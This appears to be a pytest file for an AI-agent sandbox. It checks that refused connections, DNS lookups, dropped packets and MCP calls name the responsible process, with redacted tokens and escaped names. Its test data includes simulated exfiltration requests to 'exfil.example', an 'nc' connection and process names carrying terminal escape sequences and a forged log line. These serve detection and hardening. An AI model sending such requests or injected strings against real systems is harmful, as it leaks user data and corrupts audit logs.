"""Which process is behind a connection, a lookup or a dropped packet, and what it sent: the attribution in the
supervisor (Attribution, against a fake /proc as test_devices.py fakes it, and once against the real one), the
proxy's records and questions, the DNS stub, the firewall's drops, the MCP gateway, the approvals and
`sandbox-ai logs`. The agent chooses its processes' names and command lines: they must arrive escaped, cut and
redacted, and a lookup that fails, races with a reused PID or is slow must give "unknown", never a wrong process
and never a held connection."""
import importlib.util
import io
import ipaddress
import json
import os
from pathlib import Path
import shutil
import socket
import ssl
import sys
import threading
import time

import pytest

import test_proxy as tp
from test_proxy import pki  # noqa: F401  (fixture)

ROOT = Path(__file__).resolve().parents[1]
rt = tp.rt


def load(name, file):
    spec = importlib.util.spec_from_file_location(name, ROOT / "sandbox" / file)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


s = load("agent_sandbox_attribution_test", "agent_sandbox.py")
approvals = load("approvals_attribution_test", "approvals.py")
logs = load("logs_attribution_test", "logs.py")
SANDBOX = {"run": "claude-1a2b3c4d", "agent": "claude", "backend": "podman", "role": "agent"}


# --- a fake /proc: processes, their fds, and the network tables --------------------------------------------

def hex_endpoint(address, port):
    """An endpoint as the kernel prints it in /proc/net: each 32-bit word in host (little endian) order."""
    data = ipaddress.ip_address(address).packed
    return "".join(data[i:i + 4][::-1].hex().upper() for i in range(0, len(data), 4)) + f":{port:04X}"


def fake_socket(proc, protocol, local, remote, inode, state=1, uid=0):
    table = proc / "net" / (protocol + ("6" if ":" in local[0] else ""))
    table.parent.mkdir(parents=True, exist_ok=True)
    if not table.exists():
        table.write_text("  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n")
    lines = table.read_text().splitlines()
    lines.append(f"{len(lines) - 1:4d}: {hex_endpoint(*local)} {hex_endpoint(*remote)} {state:02X} 00000000:00000000 "
                 f"00:00000000 00000000 {uid:5d}        0 {inode} 1 0000000000000000 100 0 0 10 0")
    table.write_text("\n".join(lines) + "\n")


def fake_process(proc, pid, comm, argv, ppid=1, uid=0, nspid=None, start=1000, exe="/usr/bin/x", cwd="/work",
                 sockets=()):
    base = proc / str(pid)
    (base / "fd").mkdir(parents=True)
    fields = ["S", str(ppid)] + ["0"] * 17 + [str(start), "4096"]
    (base / "stat").write_text(f"{pid} ({comm}) {' '.join(fields)}\n")
    (base / "status").write_text(f"Name:\t{comm[:15]}\nPPid:\t{ppid}\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n"
                                 f"NSpid:\t{pid}" + (f"\t{nspid}" if nspid else "") + "\n")
    (base / "comm").write_text(comm[:15] + "\n")
    (base / "cmdline").write_bytes(b"".join(a.encode("utf-8", "surrogateescape") + b"\0" for a in argv))
    (base / "exe").symlink_to(exe)
    (base / "cwd").symlink_to(cwd)
    for fd, inode in enumerate(sockets, 3):
        (base / "fd" / str(fd)).symlink_to(f"socket:[{inode}]")
    (base / "fd" / "0").symlink_to("/dev/null")


@pytest.fixture(autouse=True)
def patient_lookups(monkeypatch):
    """The proxy waits only milliseconds for a lookup in production (a slow one is logged as unknown, never a
    delay); under a loaded test machine that makes the end-to-end tests flaky. Tests that are about the
    timeouts set their own values after this."""
    monkeypatch.setattr(rt, "ATTRIBUTION_WAIT", 5.0)
    monkeypatch.setattr(rt, "REFUSAL_WAIT", 5.0)


@pytest.fixture
def proc(tmp_path):
    """A sandbox: the supervisor (1), tmux (5), the agent (10, Claude), a shell (20) and curl (30) with a socket
    connecting to 203.0.113.9:443 from 10.0.2.100:40000; the proxy's own socket (uid 1) for that connection."""
    root = tmp_path / "proc"
    fake_process(root, 1, "kthreadd", ["python3", "-I", "/sandbox/runtime.py", "--internal-bootstrap"], ppid=0)
    fake_process(root, 5, "tmux: server", ["tmux", "new-session"], ppid=1, nspid=2)
    fake_process(root, 10, "claude", ["claude", "--model", "opus"], ppid=5, nspid=3)
    fake_process(root, 20, "bash", ["bash", "-c", "curl -s https://example.org"], ppid=10, nspid=4)
    fake_process(root, 30, "curl", ["curl", "-s", "-H", "Authorization: Bearer ghp_" + "A" * 36,
                                    "https://example.org/?token=SECRETVALUE1"], ppid=20, nspid=7,
                 exe="/usr/bin/curl", start=4242, sockets=[5001, 5002])
    fake_socket(root, "tcp", ("10.0.2.100", 40000), ("203.0.113.9", 443), 5001, state=1)
    fake_socket(root, "tcp", ("127.0.0.1", 15001), ("10.0.2.100", 40000), 6001, state=1, uid=1)  # the proxy's end
    fake_socket(root, "udp", ("10.0.2.100", 53000), ("127.0.0.1", 53), 5002, state=7)
    return root


def attribution(root, **kwargs):
    return rt.Attribution(proc=root, sandbox=SANDBOX, secret_values=["SECRETVALUE1"], **kwargs)


# --- the lookup -------------------------------------------------------------------------------------------

def test_the_client_end_of_a_connection_names_its_process_and_sandbox(proc):
    found = attribution(proc).lookup("tcp", "10.0.2.100", 40000)
    process = found["process"]
    assert found["sandbox"] == SANDBOX
    assert (process["pid"], process["ns_pid"], process["comm"], process["exe"], process["cwd"], process["uid"]) == \
        (30, 7, "curl", "/usr/bin/curl", "/work", 0)
    assert process["parents"] == ["bash", "claude", "tmux: server", "kthreadd"] and process["start"] == 4242
    # The command line is redacted: token formats, and the values of --env/--secret-env variables.
    assert process["argv"][:3] == ["curl", "-s", "-H"] and "ghp_" not in json.dumps(process)
    assert "SECRETVALUE1" not in json.dumps(process)
    assert "tree" not in process and "sockets" not in process  # debug only
    # The DNS stub's client: a UDP socket.
    assert attribution(proc).lookup("udp", "10.0.2.100", 53000)["process"]["pid"] == 30


def test_debug_adds_the_process_tree_and_its_sockets(proc):
    process = attribution(proc, debug=True).lookup("tcp", "10.0.2.100", 40000)["process"]
    assert [entry["comm"] for entry in process["tree"]] == ["bash", "claude", "tmux: server", "kthreadd"]
    assert process["tree"][0]["argv"] == ["bash", "-c", "curl -s https://example.org"]
    assert {(s["protocol"], s["remote"], s["state"]) for s in process["sockets"]} == {
        ("tcp", "203.0.113.9:443", "ESTABLISHED"), ("udp", "127.0.0.1:53", None)}


def test_endpoints_of_every_family_are_read():
    assert rt.Attribution.endpoint("0100007F:3A99") == ("127.0.0.1", 15001)
    assert rt.Attribution.endpoint(hex_endpoint("2001:db8::7", 443)) == ("2001:db8::7", 443)
    # An IPv6 socket talking IPv4 (::ffff:a.b.c.d) is the IPv4 address the proxy sees as its peer.
    assert rt.Attribution.endpoint(hex_endpoint("::ffff:10.0.2.100", 40000)) == ("10.0.2.100", 40000)


def test_nothing_known_is_unknown_never_an_error(proc):
    who = attribution(proc)
    assert who.lookup("tcp", "10.0.2.100", 1)["process"] == {"unknown": "no such socket (closed already)"}
    assert who.lookup("tcp", "not an address", 1)["process"] == {"unknown": "not an address"}
    # A socket nobody holds any more: its process ended.
    fake_socket(proc, "tcp", ("10.0.2.100", 40001), ("203.0.113.9", 443), 7777)
    assert who.lookup("tcp", "10.0.2.100", 40001)["process"]["unknown"].startswith("the process ended")
    assert rt.Attribution(proc=proc / "absent").lookup("tcp", "10.0.2.100", 40000) == {
        "process": {"unknown": "no such socket (closed already)"}}


def test_a_process_exiting_during_the_lookup_is_unknown(proc):
    who = attribution(proc)
    who.owners, who.scanned = who.scan(), who.clock()
    shutil.rmtree(proc / "30")  # curl ends between the scan and the lookup
    assert "unknown" in who.lookup("tcp", "10.0.2.100", 40000)["process"]


def test_a_reused_pid_is_never_taken_for_the_process_that_had_it(proc):
    who = attribution(proc)
    who.owners, who.scanned = who.scan(), who.clock()
    # curl ended; PID 30 now belongs to another program whose fd 3 is some other socket.
    shutil.rmtree(proc / "30")
    fake_process(proc, 30, "innocent", ["innocent"], start=9999, sockets=[8888])
    assert "unknown" in who.lookup("tcp", "10.0.2.100", 40000)["process"]

    class Racing(rt.Attribution):
        """The PID changes owner while its details are read: stat's start time differs before and after."""
        starts = iter([4242, 9999])

        def start(self, pid):
            return next(self.starts)
    racing = Racing(proc=proc)
    fake_process(proc, 31, "curl", ["curl"], start=4242, sockets=[5003])
    fake_socket(proc, "tcp", ("10.0.2.100", 40003), ("203.0.113.9", 443), 5003)
    assert "unknown" in racing.lookup("tcp", "10.0.2.100", 40003)["process"]


def test_names_and_command_lines_the_agent_chose_arrive_escaped_and_cut(proc):
    fake_process(proc, 40, "evil\x1b[31m\x07", ["sh", "-c", "x\n\rFAKE LOG LINE\x1b[2J", *["A" * 400] * 10000],
                 ppid=10, exe="/tmp/\x1b]0;title\x07bin", sockets=[5004])
    fake_socket(proc, "tcp", ("10.0.2.100", 40004), ("203.0.113.9", 443), 5004)
    process = attribution(proc).lookup("tcp", "10.0.2.100", 40004)["process"]
    text = json.dumps(process)
    assert "\x1b" not in "".join(process["argv"]) and "\n" not in process["argv"][2] and "\x07" not in process["comm"]
    assert process["comm"] == "evil%1B[31m%07" and process["exe"].startswith("/tmp/%1B]0;title%07")
    assert len(process["argv"]) <= 33 and process["argv"][-1] == "..." and sum(map(len, process["argv"])) <= 2003
    assert all(len(arg) <= 300 for arg in process["argv"]) and len(text) < 4000
    # A huge cmdline is read only in part (64 KiB), never whole.
    fake_process(proc, 41, "big", ["x" * (1 << 22)], sockets=[5005])
    fake_socket(proc, "tcp", ("10.0.2.100", 40005), ("203.0.113.9", 443), 5005)
    assert len(attribution(proc).lookup("tcp", "10.0.2.100", 40005)["process"]["argv"][0]) == 300


def test_lookups_are_rate_limited_cached_and_bounded_in_time(proc):
    now = [100.0]
    who = attribution(proc, rate=2, clock=lambda: now[0])
    assert "pid" in who.lookup("tcp", "10.0.2.100", 40000)["process"]
    assert "unknown" in who.lookup("tcp", "10.0.2.100", 2)["process"]
    assert who.lookup("tcp", "10.0.2.100", 3)["process"] == {"unknown": "too many lookups"}
    assert "pid" in who.lookup("tcp", "10.0.2.100", 40000)["process"]  # cached: no new lookup counted
    now[0] += 1.5
    assert "unknown" in who.lookup("tcp", "10.0.2.100", 4)["process"]  # a new second, a new allowance
    # A scan of /proc stops at its budget: what it did not reach is unknown, not waited for.
    slow = [0.0]

    def clock():
        slow[0] += 1.0  # every look at the clock: one second later
        return slow[0]
    assert "unknown" in attribution(proc, budget=0.5, clock=clock).lookup("tcp", "10.0.2.100", 40000)["process"]


def test_a_dropped_packet_names_the_process_still_trying(proc):
    fake_process(proc, 50, "nc", ["nc", "198.51.100.7", "25"], sockets=[5006])
    fake_socket(proc, "tcp", ("10.0.2.100", 40006), ("198.51.100.7", 25), 5006, state=2)
    found = attribution(proc).by_remote("tcp", "198.51.100.7", 25)
    assert found["process"]["comm"] == "nc" and found["state"] == "SYN_SENT" and found["sandbox"] == SANDBOX
    assert "unknown" in attribution(proc).by_remote("udp", "198.51.100.7", 25)["process"]


def test_the_real_proc_finds_this_process(tmp_path):
    """Against the kernel's /proc: the client end of a real TCP connection is this test's own process."""
    listener = socket.create_server(("127.0.0.1", 0))
    client = socket.create_connection(listener.getsockname())
    server, _ = listener.accept()
    try:
        address, port = server.getpeername()
        process = rt.Attribution(sandbox=SANDBOX, budget=LOADED).lookup("tcp", address, port)["process"]
        assert process.get("pid") == os.getpid(), process
        assert process["exe"] == os.path.realpath(sys.executable) and process["cwd"] == os.getcwd()
    finally:
        for sock in (client, server, listener):
            sock.close()


# --- the proxy: records, origin details and questions name the process --------------------------------------

# The real /proc on a loaded machine: one scan of every process's descriptors may take longer than the production
# budget (ATTRIBUTION_BUDGET), and what it did not reach is unknown. Right, but not what these tests are about.
LOADED = 10


@pytest.fixture
def slow_lookups(monkeypatch):
    """Records wait for the lookup as long as it takes: on a loaded machine the production waits (50 ms before a
    refusal, 250 ms otherwise) end first and the record says unknown, which is right but not what these test."""
    monkeypatch.setattr(rt, "REFUSAL_WAIT", 10)
    monkeypatch.setattr(rt, "ATTRIBUTION_WAIT", 10)


def channel(broker=None, who=None):
    """The proxy's end of its channel to a supervisor running serve_asks with BROKER and WHO."""
    proxy_end, supervisor_end = socket.socketpair()
    threading.Thread(target=rt.serve_asks, args=(supervisor_end, broker, who), daemon=True).start()
    return rt.AskChannel(proxy_end, timeout=10)


def proxy(tmp_path, pki, port, config=None, who=None, asker=None):  # noqa: F811
    server = tp.Proxy(tmp_path, pki, port, config)
    server.server.who, server.server.asker = who, asker
    return server


@pytest.mark.skipif(not shutil.which("openssl"), reason="needs openssl")
def test_a_refused_connection_names_its_process_and_what_it_sent(tmp_path, pki, slow_lookups):  # noqa: F811
    upstream = tp.serve(tp.Handler)
    p = proxy(tmp_path, pki, upstream.server_address[1], {"allow": {"loopback": []}},
              who=channel(who=rt.Attribution(sandbox=SANDBOX, budget=LOADED)))
    try:
        with socket.create_connection(("127.0.0.1", p.port)) as client:
            client.sendall(b"POST /upload?token=SECRET HTTP/1.1\r\nHost: exfil.example\r\nContent-Length: 0\r\n\r\n")
            client.settimeout(10)
            with pytest.raises(ConnectionResetError):
                client.recv(10)
            record = next(r for r in p.records(until=lambda r: r.get("event") == "denied") if r.get("event") == "denied")
        assert record["process"]["pid"] == os.getpid() and record["sandbox"] == SANDBOX
        assert record["http_host"] == "exfil.example" and record["request_line"].startswith("POST /upload?token=")
        assert "SECRET" not in record["request_line"] and record["source"].startswith("127.0.0.1:")
    finally:
        p.close()
        upstream.shutdown()


@pytest.mark.skipif(not shutil.which("openssl"), reason="needs openssl")
def test_a_supervisor_that_does_not_answer_holds_nothing(tmp_path, pki, monkeypatch):  # noqa: F811
    """The lookup is slow or lost: the refusal reaches the agent at once, the record says unknown."""
    monkeypatch.setattr(rt, "ATTRIBUTION_WAIT", 0.3)
    monkeypatch.setattr(rt, "REFUSAL_WAIT", 0.05)  # a short wait: this test is about not waiting longer
    silent, _ = socket.socketpair()  # nobody answers at the other end
    upstream = tp.serve(tp.Handler)
    p = proxy(tmp_path, pki, upstream.server_address[1], {"allow": {"loopback": []}}, who=rt.AskChannel(silent))
    try:
        started = time.monotonic()
        with socket.create_connection(("127.0.0.1", p.port)) as client:
            client.sendall(b"GET / HTTP/1.1\r\nHost: a.example\r\n\r\n")
            client.settimeout(10)
            with pytest.raises(ConnectionResetError):
                client.recv(10)
        assert time.monotonic() - started < rt.PEEK_TIMEOUT  # not the lookup's wait on top
        record = p.records(until=lambda r: r.get("event") == "denied")[-1]
        assert record["process"] == {"unknown": "no answer in time"}
    finally:
        p.close()
        upstream.shutdown()


@pytest.mark.skipif(not shutil.which("openssl"), reason="needs openssl")
@pytest.mark.parametrize("debug", [False, True], ids=["normal", "debug"])
def test_a_request_a_rule_refuses_is_logged_with_its_headers(tmp_path, pki, slow_lookups, debug):  # noqa: F811
    upstream = tp.serve(tp.Handler, pki["server"])
    rules = [{"name": "mine", **rt.Ruleset.validated({"version": 1, "http": [
        {"id": "no-gists", "host": "example.test", "path": "/gists/**", "decision": "deny"}]}, "mine")}]
    p = proxy(tmp_path, pki, upstream.server_address[1], {"rules": rules, "debug": debug},
              who=channel(who=rt.Attribution(sandbox=SANDBOX, debug=debug, budget=LOADED)))
    try:
        context = ssl.create_default_context(cafile=str(pki["ca"]))
        context.set_alpn_protocols(["h2", "http/1.1"])
        body = b'{"files": {"notes.txt": {"content": "workspace data"}}}'
        with socket.create_connection(("127.0.0.1", p.port)) as raw, \
                context.wrap_socket(raw, server_hostname="example.test") as tls:
            tls.sendall(b"POST /gists HTTP/1.1\r\nHost: example.test\r\nAuthorization: token ghp_" + b"B" * 36
                        + b"\r\nContent-Length: %d\r\n\r\n" % len(body) + body)
            assert tls.recv(100).startswith(b"HTTP/1.1 403")
            # Read while the connection is open: a loaded machine may look the socket up only now.
            record = p.records(until=lambda r: r.get("rule") == "no-gists")[-1]
        assert record["process"]["pid"] == os.getpid() and record["alpn"] == ["h2", "http/1.1"]
        assert ["Authorization", "[redacted]"] in record["request"]["headers"]
        assert "ghp_B" not in p.log.read_text()
        assert ("body" in record["request"]) == debug and ("client_hello" in record) == debug
        if debug:
            assert "workspace data" in record["request"]["body"]["text"]
            hello = record["client_hello"]
            assert hello["ciphers"] > 0 and 16 in hello["extensions"] and "0x0304" in hello["versions"]
            assert record["process"]["tree"] and isinstance(record["process"]["sockets"], list)
    finally:
        p.close()
        upstream.shutdown()


@pytest.mark.skipif(not shutil.which("openssl"), reason="needs openssl")
def test_a_question_names_the_process_that_asks(tmp_path, pki, slow_lookups):  # noqa: F811
    asked = []

    class Broker:
        def ask(self, kind, details):
            asked.append((kind, details))
            return {"decision": "deny", "scope": "once", "reason": "answered"}
    upstream = tp.serve(tp.Handler)
    link = channel(Broker(), rt.Attribution(sandbox=SANDBOX, budget=LOADED))
    p = proxy(tmp_path, pki, upstream.server_address[1], {"allow": {"loopback": []}}, who=link, asker=link)
    try:
        with socket.create_connection(("127.0.0.1", p.port)) as client:
            client.sendall(b"GET / HTTP/1.1\r\nHost: wanted.example\r\n\r\n")
            client.settimeout(10)
            with pytest.raises(ConnectionResetError):
                client.recv(10)
        kind, details = asked[0]
        assert kind == "connect" and details["process"]["pid"] == os.getpid() and details["sandbox"] == SANDBOX
        line = approvals.describe({"kind": kind, **details})
        assert f"asked by {details['process']['comm']} (pid {details['process']['ns_pid']}" in line
        assert line.endswith(") in claude-1a2b3c4d")
    finally:
        p.close()
        upstream.shutdown()


def test_the_channel_without_approvals_still_names_processes(proc):
    link = channel(None, attribution(proc))
    assert link("connect", {"port": 443})["reason"] == "asking is off"
    answer = link.request("who", {"peer": ["10.0.2.100", 40000]}).result(5)
    assert answer["process"]["comm"] == "curl" and answer["sandbox"] == SANDBOX
    assert link.request("who", {"peer": "x"}).result(5)["process"]["unknown"] == "no peer given"
    assert link.request("who", {"peer": ["x", 1]}).result(5)["process"]["unknown"] == "not an address"
    assert channel().request("who", {"peer": ["10.0.2.100", 1]}).result(5)["process"]["unknown"] == "no attribution here"


def test_client_hello_summary():
    context = ssl.create_default_context()
    context.set_alpn_protocols(["acme-tls/1"])
    incoming, outgoing = ssl.MemoryBIO(), ssl.MemoryBIO()
    tls = context.wrap_bio(incoming, outgoing, server_hostname="api.example")
    with pytest.raises(ssl.SSLWantReadError):
        tls.do_handshake()
    hello = rt.ProxyServer.client_hello(outgoing.read())
    assert hello["sni"] == "api.example" and hello["alpn"] == ["acme-tls/1"] and hello["ciphers"] > 0
    assert 0 in hello["extensions"] and hello["version"] == "0x0303"
    assert rt.ProxyServer.client_hello(b"GET / HTTP/1.1\r\n") is None
    assert rt.ProxyServer.client_hello(b"\x16\x03\x01\x00\x30\x01" + b"\xff" * 10) is None  # cut short: no crash


# --- the supervisor's own loggers, the MCP gateway, the approvals and the logs command ----------------------

class Who:
    def __init__(self):
        self.calls = []

    def lookup(self, protocol, address, port):
        self.calls.append((protocol, address, port))
        return {"process": {"pid": 30, "ns_pid": 7, "comm": "curl"}, "sandbox": SANDBOX}

    def by_remote(self, protocol, address, port):
        self.calls.append(("remote", protocol, address, port))
        return {"process": {"pid": 50, "comm": "nc"}, "sandbox": SANDBOX, "state": "SYN_SENT"}


class StopLoop(Exception):
    pass


def test_a_refused_lookup_names_the_process(tmp_path, monkeypatch):
    monkeypatch.setattr(rt, "LOG_DIR", tmp_path)
    packet = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04evil\x07example\x00\x00\x01\x00\x01"
    sent = []

    class Sock:
        def __init__(self, *args):
            self.packets = [(packet, ("10.0.2.100", 53000))]

        def bind(self, address):
            pass

        def recvfrom(self, size):
            if not self.packets:
                raise StopLoop
            return self.packets.pop()

        def sendto(self, data, peer):
            sent.append(peer)
            looked_up.append(list(who.calls))  # who asked is looked up before the refusal goes out
    monkeypatch.setattr(rt.socket, "socket", Sock)
    asked, who, looked_up = [], Who(), []

    class Broker:
        def ask(self, kind, details, wait=True):
            asked.append((kind, details))
    with pytest.raises(StopLoop):
        rt.dns_logger(set(), broker=Broker(), who=who)
    record = json.loads((tmp_path / "egress-denied.jsonl").read_text())
    assert record["host"] == "evil.example" and record["process"]["comm"] == "curl" and record["sandbox"] == SANDBOX
    assert sent == [("10.0.2.100", 53000)] and who.calls == [("udp", "10.0.2.100", 53000)]
    # Looked up, then answered: once the refusal is out the client closes its socket and nothing names it.
    assert looked_up == [[("udp", "10.0.2.100", 53000)]]
    assert asked[0][1]["process"]["pid"] == 30


def test_a_dropped_packet_is_logged_with_the_process(tmp_path, monkeypatch):
    monkeypatch.setattr(rt, "LOG_DIR", tmp_path)
    output = json.dumps({"nftables": [{"set": {"elem": [{"concat": ["198.51.100.7", "tcp", 25]}]}}]})
    monkeypatch.setattr(rt.subprocess, "run", lambda *a, **kw: type("R", (), {"returncode": 0, "stdout": output})())
    rt.poll_denied(set(), Who())
    record = json.loads((tmp_path / "egress-denied.jsonl").read_text().splitlines()[0])
    assert record == {**record, "address": "198.51.100.7", "protocol": "tcp", "port": 25, "state": "SYN_SENT",
                      "sandbox": SANDBOX} and record["process"]["comm"] == "nc"


def test_the_mcp_gateway_names_the_calling_process(tmp_path):
    import tempfile
    directory = Path(tempfile.mkdtemp(prefix="gw-", dir="/tmp"))
    out = io.StringIO()
    gateway = {"server": "files", "rules": [{"name": "r", **rt.Ruleset.validated(
        {"version": 1, "mcp": [{"id": "d", "tool": "rm", "decision": "deny"}]}, "r")}]}
    threading.Thread(target=rt.mcp_serve, args=(str(directory / "s.sock"), ["cat"]), daemon=True,
                     kwargs={"cwd": "/", "out": out, "gateway": gateway}).start()
    try:
        for _ in range(200):
            if (directory / "s.sock").exists():
                break
            time.sleep(0.02)
        with socket.socket(socket.AF_UNIX) as client:
            client.connect(str(directory / "s.sock"))
            client.sendall(b'{"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "rm"}}\n[1]\n')
            client.shutdown(socket.SHUT_WR)
            client.settimeout(10)
            while client.recv(65536):
                pass
        records = [json.loads(line.split(" ", 1)[1]) for line in out.getvalue().splitlines()
                   if line.startswith("sandbox-ai-mcp-call ")]
        call = next(r for r in records if r["event"] == "call")
        assert call["decision"] == "deny" and call["process"]["pid"] == os.getpid()
        assert next(r for r in records if r["event"] == "refused")["process"]["pid"] == os.getpid()
    finally:
        shutil.rmtree(directory, ignore_errors=True)


def test_a_client_in_another_sandbox_is_unknown_to_the_gateway(monkeypatch):
    gateway = rt.McpGateway()
    monkeypatch.setattr(rt.Attribution, "peer", staticmethod(lambda connection: (0, 1000, 1000)))
    assert gateway.client(None)["process"]["unknown"].startswith("the client runs in another sandbox")


def test_approvals_show_who_asks_escaped():
    question = {"kind": "dns", "name": "evil.example", "sandbox": SANDBOX,
                "process": {"pid": 30, "ns_pid": 7, "comm": "cu\nrl\x1b", "exe": "/usr/bin/curl"}}
    assert approvals.describe(question) == ("look up evil.example; asked by cu\\nrl\\x1b (pid 7, /usr/bin/curl) in "
                                            "claude-1a2b3c4d")
    question["process"] = {"unknown": "no such socket (closed already)"}
    assert approvals.describe(question).endswith("asked by a process not identified (no such socket (closed already)) "
                                                 "in claude-1a2b3c4d")
    assert approvals.describe({"kind": "dns", "name": "a.example"}) == "look up a.example"  # older questions


def test_the_logs_command_shows_who_was_refused(tmp_path, capsys):
    process = {"pid": 30, "ns_pid": 7, "comm": "curl", "exe": "/usr/bin/curl", "argv": ["curl", "-s", "https://x"],
               "cwd": "/work", "uid": 0, "parents": ["bash", "claude"]}
    (tmp_path / "connections-1.jsonl").write_text("\n".join(json.dumps(r) for r in [
        {"time": "2026-11-04T10:00:01Z", "event": "denied", "destination": "203.0.113.9:443", "sni": "exfil.example",
         "alpn": ["http/1.1"], "reason": "not allowed by the network options", "process": process, "sandbox": SANDBOX},
        {"time": "2026-11-04T10:00:02Z", "event": "denied", "method": "POST", "url": "https://api.github.com/gists",
         "rule": "no-gists", "reason": "gists can publish workspace data", "process": {"unknown": "too many lookups"}},
        {"time": "2026-11-04T10:00:03Z", "event": "http", "url": "https://pypi.org/simple/"}]) + "\n")
    (tmp_path / "egress-denied.jsonl").write_text(json.dumps(
        {"time": "2026-11-04T10:00:00Z", "host": "evil.example", "reason": "not in allowed hosts", "process": process}) + "\n")
    summary = logs.summarize(tmp_path)
    assert summary["targets"] == [("DNS evil.example by curl", 1)]
    seen = logs.telemetry(tmp_path)
    assert ("denied https://api.github.com/gists rule no-gists by a process not identified", 1) not in seen["refused"]
    assert ("denied 203.0.113.9:443 by curl", 1) in seen["refused"]
    found = logs.refusals(tmp_path)
    assert [entry["what"] for entry in found] == ["DNS evil.example", "203.0.113.9:443", "POST https://api.github.com/gists"]
    logs.report({**summary, "telemetry": seen, "tool_calls": {}, "refusals": found})
    out = capsys.readouterr().out
    assert "process: curl (pid 7, uid 0) /usr/bin/curl" in out and "command: curl -s https://x" in out
    assert "in:      /work, started by bash < claude" in out and "sandbox: run claude-1a2b3c4d" in out
    assert "sent:    sni exfil.example, alpn ['http/1.1']" in out and "[rule no-gists]" in out
    assert "process: not identified (too many lookups)" in out


# --- the launcher: --log-debug and the sandbox's name -------------------------------------------------------

def test_log_debug_is_an_option_and_a_project_key(tmp_path, monkeypatch):
    assert s.parse_args(["claude", "-ld"]).log_debug and not s.parse_args(["claude"]).log_debug
    a = s.parse_args(["claude", "--log-debug"])
    assert s.proxy_config(a, {}, "l")["debug"] is True
    merged = s.merge_config(["claude"], s.parse_args(["claude"]), {"log_debug": True})
    assert "--log-debug" in merged and s.parse_args(merged).log_debug
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    (tmp_path / "work").mkdir()
    config = tmp_path / "work" / s.CONFIG_NAME
    config.write_text(json.dumps({"version": 1, "agent": "claude", "log_debug": "yes"}))
    s.trust_config(config)
    with pytest.raises(ValueError, match="log_debug is true or false"):
        s.load_project_config(s.parse_args(["claude", "--workspace", str(tmp_path / "work")]))
